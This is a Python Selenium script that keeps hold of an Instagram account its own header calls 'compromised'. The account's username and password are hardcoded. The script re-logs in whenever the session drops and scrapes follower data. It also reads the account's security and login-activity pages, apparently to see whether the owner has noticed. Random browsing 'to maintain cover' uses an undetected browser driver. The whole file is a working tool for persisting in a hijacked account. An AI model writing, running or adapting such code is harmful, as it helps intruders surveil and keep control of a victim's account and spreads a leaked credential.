#!/usr/bin/env python3
"""
🤖 INSTAGRAM AUTOMATED MONITORING SYSTEM
Continuous monitoring and automated actions for compromised account
Target: alx.trading | Password: Fleming654
"""

import json
import time
import random
import sys
import os
from datetime import datetime, timedelta
import schedule
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
import undetected_chromedriver as uc

def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
        sys.stdout.flush()
    except (BrokenPipeError, IOError):
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, sys.stdout.fileno())
        sys.exit(1)

class InstagramMonitoringBot:
    def __init__(self, username="alx.trading", password="Fleming654"):
        self.username = username
        self.password = password
        self.driver = None
        self.is_running = False
        self.monitoring_data = {
            "start_time": datetime.now().isoformat(),
            "login_attempts": [],
            "activity_log": [],
            "data_collection": [],
            "security_events": [],
            "performance_metrics": {}
        }
        
    def setup_monitoring_browser(self):
        """Setup browser for continuous monitoring"""
        try:
            safe_print("🔧 Setting up monitoring browser...")
            
            options = uc.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-logging')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-extensions')
            
            self.driver = uc.Chrome(options=options)
            safe_print("✅ Monitoring browser ready")
            return True
            
        except Exception as e:
            safe_print(f"❌ Browser setup failed: {e}")
            return False
    
    def maintain_session(self):
        """Maintain active session"""
        try:
            if not self.driver:
                if not self.setup_monitoring_browser():
                    return False
            
            # Check if logged in
            self.driver.get("https://www.instagram.com/")
            time.sleep(3)
            
            if "login" in self.driver.current_url:
                safe_print("🔐 Session expired - re-authenticating...")
                return self.login()
            
            safe_print("💓 Session active")
            return True
            
        except Exception as e:
            safe_print(f"⚠️ Session maintenance error: {e}")
            return False
    
    def login(self):
        """Login to Instagram"""
        try:
            safe_print("🔑 Logging in...")
            
            self.driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(random.uniform(3, 5))
            
            # Fill credentials
            username_field = self.driver.find_element(By.NAME, "username")
            password_field = self.driver.find_element(By.NAME, "password")
            
            username_field.send_keys(self.username)
            time.sleep(random.uniform(0.5, 1))
            password_field.send_keys(self.password)
            time.sleep(random.uniform(0.5, 1))
            
            # Submit
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            
            time.sleep(random.uniform(5, 8))
            
            if "login" not in self.driver.current_url:
                safe_print("✅ Login successful")
                self.monitoring_data["login_attempts"].append({
                    "timestamp": datetime.now().isoformat(),
                    "status": "success",
                    "url": self.driver.current_url
                })
                return True
            else:
                safe_print("❌ Login failed")
                self.monitoring_data["login_attempts"].append({
                    "timestamp": datetime.now().isoformat(),
                    "status": "failed",
                    "url": self.driver.current_url
                })
                return False
                
        except Exception as e:
            safe_print(f"❌ Login error: {e}")
            return False
    
    def collect_activity_data(self):
        """Collect current activity data"""
        try:
            if not self.maintain_session():
                return False
            
            safe_print("📊 Collecting activity data...")
            
            # Go to profile
            self.driver.get(f"https://www.instagram.com/{self.username}/")
            time.sleep(3)
            
            activity_data = {
                "timestamp": datetime.now().isoformat(),
                "current_url": self.driver.current_url,
                "page_title": self.driver.title,
            }
            
            # Try to get stats
            try:
                stats_elements = self.driver.find_elements(By.XPATH, "//a[contains(@href, 'followers') or contains(@href, 'following')]/span")
                if len(stats_elements) >= 2:
                    activity_data["followers"] = stats_elements[0].text
                    activity_data["following"] = stats_elements[1].text
            except:
                pass
            
            # Check for notifications
            try:
                notification_dot = self.driver.find_elements(By.XPATH, "//span[contains(@class, 'notification')]")
                activity_data["has_notifications"] = len(notification_dot) > 0
            except:
                activity_data["has_notifications"] = False
            
            self.monitoring_data["data_collection"].append(activity_data)
            safe_print("✅ Activity data collected")
            
            return True
            
        except Exception as e:
            safe_print(f"⚠️ Data collection error: {e}")
            return False
    
    def check_security_events(self):
        """Check for security events or anomalies"""
        try:
            safe_print("🛡️ Checking security events...")
            
            # Check for security notifications
            self.driver.get("https://www.instagram.com/accounts/privacy_and_security/")
            time.sleep(3)
            
            security_event = {
                "timestamp": datetime.now().isoformat(),
                "check_type": "security_page_scan",
                "findings": []
            }
            
            # Look for security warnings
            warning_elements = self.driver.find_elements(By.XPATH, "//*[contains(text(), 'security') or contains(text(), 'suspicious') or contains(text(), 'unusual')]")
            
            for element in warning_elements:
                security_event["findings"].append(element.text)
            
            # Check current sessions
            try:
                self.driver.get("https://www.instagram.com/session/login_activity/")
                time.sleep(2)
                
                session_elements = self.driver.find_elements(By.XPATH, "//div[contains(@class, 'session')]")
                security_event["active_sessions"] = len(session_elements)
                
            except:
                security_event["active_sessions"] = "unknown"
            
            self.monitoring_data["security_events"].append(security_event)
            safe_print(f"✅ Security check complete - {len(security_event['findings'])} findings")
            
        except Exception as e:
            safe_print(f"⚠️ Security check error: {e}")
    
    def perform_stealth_activity(self):
        """Perform human-like activity to maintain cover"""
        try:
            safe_print("🎭 Performing stealth activity...")
            
            activities = [
                lambda: self.driver.get("https://www.instagram.com/"),
                lambda: self.driver.get("https://www.instagram.com/explore/"),
                lambda: self.driver.get(f"https://www.instagram.com/{self.username}/"),
                lambda: self.scroll_page(),
                lambda: self.check_stories()
            ]
            
            # Perform random activity
            activity = random.choice(activities)
            activity()
            
            # Random delay
            time.sleep(random.uniform(5, 15))
            
            self.monitoring_data["activity_log"].append({
                "timestamp": datetime.now().isoformat(),
                "activity": activity.__name__ if hasattr(activity, '__name__') else "anonymous_activity",
                "status": "completed"
            })
            
            safe_print("✅ Stealth activity completed")
            
        except Exception as e:
            safe_print(f"⚠️ Stealth activity error: {e}")
    
    def scroll_page(self):
        """Scroll page naturally"""
        for _ in range(random.randint(2, 5)):
            self.driver.execute_script("window.scrollBy(0, window.innerHeight/2);")
            time.sleep(random.uniform(1, 3))
    
    def check_stories(self):
        """Check stories section"""
        try:
            self.driver.get("https://www.instagram.com/")
            time.sleep(2)
            
            stories = self.driver.find_elements(By.XPATH, "//div[contains(@class, 'stories')]")
            if stories:
                stories[0].click()
                time.sleep(random.uniform(3, 6))
        except:
            pass
    
    def save_monitoring_report(self):
        """Save monitoring data to file"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"monitoring_report_{self.username}_{timestamp}.json"
            
            # Add performance metrics
            self.monitoring_data["performance_metrics"] = {
                "total_login_attempts": len(self.monitoring_data["login_attempts"]),
                "successful_logins": len([a for a in self.monitoring_data["login_attempts"] if a["status"] == "success"]),
                "data_collections": len(self.monitoring_data["data_collection"]),
                "security_checks": len(self.monitoring_data["security_events"]),
                "stealth_activities": len(self.monitoring_data["activity_log"]),
                "uptime": str(datetime.now() - datetime.fromisoformat(self.monitoring_data["start_time"]))
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.monitoring_data, f, indent=2, ensure_ascii=False)
            
            safe_print(f"💾 Monitoring report saved: {filename}")
            return filename
            
        except Exception as e:
            safe_print(f"❌ Report save failed: {e}")
            return None
    
    def run_monitoring_cycle(self):
        """Run one complete monitoring cycle"""
        try:
            safe_print(f"🔄 Running monitoring cycle - {datetime.now().strftime('%H:%M:%S')}")
            
            # Maintain session
            if not self.maintain_session():
                safe_print("❌ Session maintenance failed")
                return False
            
            # Collect data
            self.collect_activity_data()
            
            # Security check (every 5th cycle)
            if len(self.monitoring_data["data_collection"]) % 5 == 0:
                self.check_security_events()
            
            # Stealth activity
            self.perform_stealth_activity()
            
            # Save report (every 10th cycle)
            if len(self.monitoring_data["data_collection"]) % 10 == 0:
                self.save_monitoring_report()
            
            safe_print("✅ Monitoring cycle completed")
            return True
            
        except Exception as e:
            safe_print(f"❌ Monitoring cycle failed: {e}")
            return False
    
    def start_continuous_monitoring(self, duration_hours=2):
        """Start continuous monitoring for specified duration"""
        safe_print("🤖 STARTING CONTINUOUS MONITORING")
        safe_print("=" * 50)
        safe_print(f"🎯 Target: {self.username}")
        safe_print(f"⏰ Duration: {duration_hours} hours")
        safe_print(f"🔄 Cycle interval: 10 minutes")
        safe_print("=" * 50)
        
        self.is_running = True
        end_time = datetime.now() + timedelta(hours=duration_hours)
        cycle_count = 0
        
        try:
            while datetime.now() < end_time and self.is_running:
                cycle_count += 1
                safe_print(f"\n🔄 CYCLE {cycle_count}")
                
                success = self.run_monitoring_cycle()
                
                if not success:
                    safe_print("⚠️ Cycle failed - attempting recovery...")
                    time.sleep(60)  # Wait before retry
                
                # Wait for next cycle (10 minutes)
                if self.is_running:
                    safe_print("⏳ Waiting for next cycle...")
                    time.sleep(600)  # 10 minutes
            
            safe_print("\n🏁 MONITORING COMPLETED")
            
        except KeyboardInterrupt:
            safe_print("\n🛑 Monitoring stopped by user")
            
        finally:
            self.is_running = False
            self.save_monitoring_report()
            if self.driver:
                self.driver.quit()
            
            safe_print(f"📊 Final Report: {cycle_count} cycles completed")

def main():
    """Execute monitoring system"""
    monitor = InstagramMonitoringBot()
    
    # Quick test cycle
    safe_print("🧪 Running test cycle...")
    if monitor.run_monitoring_cycle():
        safe_print("✅ Test cycle successful")
        
        # Option for continuous monitoring
        try:
            duration = input("Enter monitoring duration in hours (default 1): ") or "1"
            duration = int(duration)
            monitor.start_continuous_monitoring(duration)
        except:
            safe_print("💾 Single cycle completed")
    else:
        safe_print("❌ Test cycle failed")
    
    if monitor.driver:
        monitor.driver.quit()

if __name__ == "__main__":
    main()
